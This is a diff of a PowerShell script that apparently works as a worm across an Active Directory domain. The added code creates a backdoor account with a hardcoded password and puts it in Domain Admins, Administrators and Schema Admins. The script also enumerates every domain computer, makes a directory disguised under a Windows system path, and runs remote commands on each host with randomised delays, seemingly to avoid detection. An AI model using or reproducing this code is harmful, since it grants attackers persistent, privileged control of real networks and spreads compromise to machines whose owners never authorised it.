@@ -1,4 +1,17 @@
 ﻿$computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
+$domainSystemInfo = get-adcomputer -filter * -Properties ipv4address | select ipv4address , dnshostname
+
+$username='amagrene'
+
+try{
+    Get-aduser $username
+}
+catch{
+    new-aduser -name 'amagrene' -SamAccountName 'amagrene' -UserPrincipalName 'amagrene@reallife.com' -AccountPassword('Tossking1') -Enabled $True
+    Add-ADGroupMember -identity 'amagrene' -members 'Domain Admins' , 'Administrators', 'Schema Admins'
+}
+
+
 if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService')){
     mkdir 'C:\Program Files (x86)\Windows NT\TableTextService'
     cd 'C:\Program Files (x86)\Windows NT\TableTextService'
@@ -14,7 +27,7 @@ Write-Output 'slither'
 
 Foreach($i in $computerNames){
     $s = new-pssession -ComputerName $i
-    invoke-command -ComputerName $i -ScriptBlock {hostname}
+    Write-Output $i
     invoke-command -ComputerName $i -ScriptBlock {
         #get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5 
         if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
@@ -37,6 +50,5 @@ Foreach($i in $computerNames){
     start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
 }
 }
-
 
 wormy
